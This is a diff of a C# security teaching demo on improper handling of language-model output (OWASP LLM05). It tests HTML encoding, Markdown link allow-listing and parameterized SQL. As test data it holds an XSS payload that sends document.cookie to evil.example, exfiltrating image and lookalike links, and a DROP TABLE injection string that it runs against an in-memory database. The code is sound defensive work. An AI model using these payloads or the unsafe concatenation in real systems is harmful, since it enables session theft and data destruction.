@@ -1,72 +1,111 @@
 // ============================================================================
-// Improper Output Handling (OWASP LLM05)
+// Improper output handling (OWASP LLM05:2025)
 // ----------------------------------------------------------------------------
-// The chapter already redacts PII *out* of a response. This demo covers the
-// other direction: an LLM's output is UNTRUSTED INPUT to whatever consumes it.
-// The model can be steered (directly, or via the indirect injection from the
-// Ch20.IndirectInjection demo) into emitting a string that is harmless as text
-// but dangerous the moment it is interpolated into HTML (XSS), SQL (injection),
-// a shell command, or a file path.
+// A model's answer is untrusted input to whatever consumes it. The fix is not
+// "sanitize the model"; it is the boundary discipline you apply to any input:
+// encode or parameterize at every sink the answer crosses.
 //
-// The fix is not "sanitize the model." It is the same boundary discipline you
-// already apply to user input: ENCODE or PARAMETERIZE at every sink the answer
-// crosses. This sample shows the unsafe and safe paths for the two most common
-// sinks — HTML and SQL — with no LLM call, so the output is deterministic.
+//   Sink 1  HTML      encode before it touches the page
+//   Sink 2  Markdown  links and images only to allow-listed hosts (an image
+//                     URL is a request the browser sends without a click)
+//   Sink 3  SQL       parameters, never concatenation (real in-memory SQLite)
+//
+// No model: the answers are fixed strings, so every run is the same.
+//   dotnet run -- --self-test     prints RESULT n/n, exit code 1 on any failure
 // ============================================================================
 
 using System.Text.Encodings.Web;
+using Ch20.OutputHandling;
+using Microsoft.Data.Sqlite;
 
-Console.WriteLine("=== Improper Output Handling (LLM05) ===");
-Console.WriteLine();
+bool selfTest = args.Contains("--self-test");
+Console.WriteLine(selfTest
+    ? "=== Improper output handling: self-test ==="
+    : "=== Improper output handling (no model; the same suite runs with --self-test) ===");
 
-// A model answer that LOOKS like a normal helpful response but carries an
-// HTML/script payload — possibly because a retrieved doc (indirect injection)
-// told the model to include it.
-const string modelAnswer =
-    "Sure! Add this banner: <img src=x onerror=\"fetch('https://evil.example/c='+document.cookie)\">";
+SQLitePCL.Batteries_V2.Init();
+int passed = 0, total = 0;
+void Expect(string name, bool ok)
+{
+    total++;
+    if (ok) passed++;
+    Console.WriteLine($"  {(ok ? "PASS" : "FAIL")}  {name}");
+}
 
-// ── Sink 1: HTML ─────────────────────────────────────────────────────
-Console.WriteLine("-- Sink 1: rendering the answer in a web view --");
-Console.WriteLine();
+Console.WriteLine("\n-- Sink 1: HTML --");
+const string htmlAnswer = "Sure! Add this banner: <img src=x onerror=\"fetch('https://evil.example/c='+document.cookie)\">";
+string encoded = HtmlEncoder.Default.Encode(htmlAnswer);
+Expect("DEFECT REPRODUCED: raw interpolation keeps a live <img onerror>",
+    $"<div>{htmlAnswer}</div>".Contains("<img src=x onerror=", StringComparison.Ordinal));
+Expect("encoded: no '<' survives, the payload is text", !encoded.Contains('<') && encoded.Contains("&lt;img", StringComparison.Ordinal));
 
-// UNSAFE: interpolating the answer straight into markup. The <img onerror>
-// fires in the victim's browser. This is stored/reflected XSS.
-string unsafeHtml = $"<div class=\"answer\">{modelAnswer}</div>";
-Console.WriteLine("UNSAFE (raw interpolation):");
-Console.WriteLine($"  {unsafeHtml}");
-Console.WriteLine();
+Console.WriteLine("\n-- Sink 2: Markdown links and images --");
+SafeMarkdown markdown = new(["contoso.example", "learn.microsoft.com"]);
+(string Input, string Expected)[] links =
+[
+    ("See [the policy](https://contoso.example/policies/returns).",
+     "See [the policy](https://contoso.example/policies/returns)."),
+    ("Docs: [DI](https://learn.microsoft.com/dotnet/core/extensions/dependency-injection)",
+     "Docs: [DI](https://learn.microsoft.com/dotnet/core/extensions/dependency-injection)"),
+    ("![status](https://evil.example/pixel.png?d=E-1001-balance-500)",
+     "[image removed: evil.example]"),
+    ("[portal](https://contoso.example.evil.example/login)",
+     "portal [link removed: contoso.example.evil.example]"),
+    ("[help](https://evil.example/?ref=contoso.example)",
+     "help [link removed: evil.example]"),
+    ("[click](javascript:alert(1))",
+     "click [link removed: not https]"),
+    ("[plain](http://contoso.example/policies)",
+     "plain [link removed: not https]"),
+];
+foreach ((string input, string expected) in links)
+{
+    string rendered = markdown.Render(input);
+    Expect($"{input} -> {rendered}", rendered == expected);
+}
+Expect("DEFECT REPRODUCED: a substring host check accepts contoso.example.evil.example",
+    SafeMarkdown.NaiveSubstringCheck("https://contoso.example.evil.example/login", "contoso.example"));
+Expect("DEFECT REPRODUCED: a substring host check accepts evil.example/?ref=contoso.example",
+    SafeMarkdown.NaiveSubstringCheck("https://evil.example/?ref=contoso.example", "contoso.example"));
 
-// SAFE: HTML-encode the answer before it touches the page. The payload becomes
-// inert text; the browser renders it but never executes it.
-string encoded = HtmlEncoder.Default.Encode(modelAnswer);
-Console.WriteLine("SAFE (HTML-encoded):");
-Console.WriteLine($"  <div class=\"answer\">{encoded}</div>");
-Console.WriteLine();
-
-// ── Sink 2: SQL ──────────────────────────────────────────────────────
-Console.WriteLine("-- Sink 2: using the answer in a database query --");
-Console.WriteLine();
-
-// An agent extracts a "customer name" from a conversation and you persist it.
-// A crafted value closes the string literal and tacks on a second statement.
+Console.WriteLine("\n-- Sink 3: SQL (in-memory SQLite) --");
 const string extractedName = "Robert'); DROP TABLE Customers;--";
+using (SqliteConnection db = NewDatabase())
+{
+    using SqliteCommand unsafeInsert = db.CreateCommand();
+    unsafeInsert.CommandText = $"INSERT INTO Customers (Name) VALUES ('{extractedName}')";
+    unsafeInsert.ExecuteNonQuery();
+    Expect("DEFECT REPRODUCED: concatenated SQL ran the model's DROP TABLE", !TableExists(db, "Customers"));
+}
+using (SqliteConnection db = NewDatabase())
+{
+    using SqliteCommand insert = db.CreateCommand();
+    insert.CommandText = "INSERT INTO Customers (Name) VALUES ($name)";
+    insert.Parameters.AddWithValue("$name", extractedName);
+    insert.ExecuteNonQuery();
+    using SqliteCommand read = db.CreateCommand();
+    read.CommandText = "SELECT Name FROM Customers";
+    Expect("parameterized: the table survives and stores the text as data",
+        TableExists(db, "Customers") && (string?)read.ExecuteScalar() == extractedName);
+}
 
-// UNSAFE: string-concatenated SQL. Classic injection (Little Bobby Tables).
-string unsafeSql = $"INSERT INTO Customers (Name) VALUES ('{extractedName}')";
-Console.WriteLine("UNSAFE (string-concatenated SQL):");
-Console.WriteLine($"  {unsafeSql}");
-Console.WriteLine();
+Console.WriteLine($"\nRESULT {passed}/{total}");
+return passed == total ? 0 : 1;
 
-// SAFE: parameterize. The command text contains a placeholder; the value is
-// bound as data and never parsed as SQL. Every ADO.NET provider (SqlCommand,
-// NpgsqlCommand, SqliteCommand, ...) uses exactly this shape.
-const string safeSql = "INSERT INTO Customers (Name) VALUES (@name)";
-Console.WriteLine("SAFE (parameterized — value bound, never parsed as SQL):");
-Console.WriteLine($"  CommandText : {safeSql}");
-Console.WriteLine($"  @name       : {extractedName}");
-Console.WriteLine();
+static SqliteConnection NewDatabase()
+{
+    SqliteConnection db = new("Data Source=:memory:");
+    db.Open();
+    using SqliteCommand create = db.CreateCommand();
+    create.CommandText = "CREATE TABLE Customers (Id INTEGER PRIMARY KEY, Name TEXT NOT NULL)";
+    create.ExecuteNonQuery();
+    return db;
+}
 
-Console.WriteLine("Key takeaway: never trust, never interpolate —");
-Console.WriteLine("encode or parameterize at every boundary the answer crosses.");
-Console.WriteLine();
-Console.WriteLine("=== Done ===");
+static bool TableExists(SqliteConnection db, string name)
+{
+    using SqliteCommand cmd = db.CreateCommand();
+    cmd.CommandText = "SELECT count(*) FROM sqlite_master WHERE type = 'table' AND name = $n";
+    cmd.Parameters.AddWithValue("$n", name);
+    return (long)cmd.ExecuteScalar()! == 1;
+}
